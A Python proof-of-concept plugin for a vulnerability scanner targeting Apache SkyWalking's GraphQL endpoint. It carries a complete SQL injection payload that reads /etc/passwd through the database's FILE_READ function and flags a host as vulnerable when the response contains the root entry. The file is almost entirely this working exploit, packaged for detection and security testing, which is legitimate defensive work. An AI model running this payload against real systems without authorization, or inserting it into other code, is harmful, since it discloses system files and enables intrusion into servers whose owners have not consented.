#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    data = """{"query":"query queryLogs($condition: LogQueryCondition) {queryLogs(condition: $condition) {        
    logs{content}}}","variables":{"condition":{"metricName":"INFORMATION_SCHEMA.USERS) 
    union SELECT FILE_READ('/etc/passwd', NULL) where ?=1 or ?=1 or 1=1--",
    "paging":{"pageNum":1,"pageSize":1,"needTotal":true},"state":ALL, "queryDuration":
    {"start":"2021-02-07 1554","end":"2021-02-07 1609","step":"MINUTE"}}}}"""

    url = "{}://{}:{}/graphql".format(service, ip, port)
    try:

        r = await http_client(ip, port).post(url, data=data, timeout=20)

        if r.text.find("root:x:0") >= 0:
            ret = {
                'alert_group': 'SkyWalking SQL Injection',
                'affects': url,
                'details': 'post \n{data}\n to /graphql\n修复方式: 升级至最新版本'.format(data=data)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
